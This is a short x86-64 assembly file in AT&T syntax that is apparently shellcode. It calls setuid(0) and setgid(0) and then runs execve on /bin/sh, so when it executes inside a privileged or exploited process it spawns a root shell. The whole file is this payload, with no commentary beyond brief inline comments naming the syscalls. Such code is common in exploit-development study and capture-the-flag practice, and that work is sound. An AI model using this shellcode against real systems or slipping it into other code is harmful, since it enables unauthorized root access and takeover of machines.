.text
.global _start
_start:
        mov $105, %rax # setuid(0)
        xor %rdi, %rdi
        syscall

        mov $106, %rax # setgid(0)
        xor %rdi, %rdi
        syscall

        lea sh(%rip), %rdi # execve("/bin/sh", NULL, NULL)
        mov $59, %rax
        xor %rsi, %rsi
        xor %rdx, %rdx
        syscall
sh:
.asciz "/bin/sh"
